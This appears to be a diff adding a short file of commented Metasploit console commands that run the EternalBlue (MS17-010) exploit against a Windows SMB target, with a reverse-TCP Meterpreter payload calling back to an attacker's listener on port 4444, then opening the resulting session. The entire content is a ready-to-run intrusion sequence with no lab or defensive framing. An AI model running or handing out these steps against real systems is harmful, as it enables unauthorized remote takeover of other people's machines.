@@ -1,0 +1,10 @@
+msfconsole                                     # Start Metasploit console
+search ms17_010                                # Search for EternalBlue exploit
+use exploit/windows/smb/ms17_010_eternalblue  # Load the exploit module
+set PAYLOAD windows/x64/meterpreter/reverse_tcp  # Select payload
+set RHOST 192.168.1.10                         # Set target IP
+set LHOST 192.168.1.5                          # Set attacker's IP
+set LPORT 4444                                 # Set local port for callback
+exploit                                        # Run the exploit
+sessions                                       # List active sessions
+sessions -i 1                                  # Interact with session 1
